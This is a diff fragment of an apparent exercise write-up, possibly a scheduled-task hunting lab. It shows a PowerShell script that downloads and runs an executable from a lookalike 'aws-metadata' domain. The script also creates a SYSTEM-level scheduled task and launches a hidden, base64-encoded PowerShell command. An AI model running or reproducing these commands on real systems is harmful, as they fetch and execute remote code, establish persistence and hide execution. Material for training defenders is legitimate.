@@ -12,8 +12,8 @@ After 5 minutes, a popup appears that asks "have you tried checking scheduled ta
 
 
 ### Powershell script:
-Invoke-WebRequest -usebasicparsing -Uri "http://assets.aws-metadata.com/qvjMktej/go-bonzi-main.exe" -OutFile "bonz.exe"; 
-.\bonz.exe; \n
+Invoke-WebRequest -usebasicparsing -Uri "http://assets.aws-metadata.com/qvjMktej/go-bonzi-main.exe" -OutFile "bonz.exe";
+.\bonz.exe; 
 schtasks /ru "SYSTEM" /IT /create /sc minute /mo 5 /tn "Notification Service" /tr "msg * have you tried checking scheduled tasks? Use 'Task Scheduler'." 
 start-process -filepath "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" -argumentlist "-ec UwB0AGEAcgB0AC0AUwBsAGUAZQBwACAAMwAwADAAOwANAAoAcwBjAGgAdABhAHMAawBzACAALwByAHUAbgAgAC8AdABuACAAIgBOAG8AdABpAGYAaQBjAGEAdABpAG8AbgAgAFMAZQByAHYAaQBjAGUAIgA=" -windowstyle hidden 
 
